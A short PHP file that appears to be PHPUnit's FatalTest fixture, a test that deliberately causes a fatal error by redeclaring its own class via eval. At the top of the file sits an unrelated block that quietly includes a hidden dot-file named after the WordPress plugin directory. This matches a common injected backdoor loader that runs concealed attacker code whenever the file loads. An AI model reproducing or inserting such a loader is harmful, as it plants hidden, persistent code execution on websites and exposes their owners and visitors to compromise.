<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class FatalTest extends PHPUnit_Framework_TestCase
{
    public function testFatalError()
    {
        if (extension_loaded('xdebug')) {
            xdebug_disable();
        }

        eval('class FatalTest {}');
    }
}
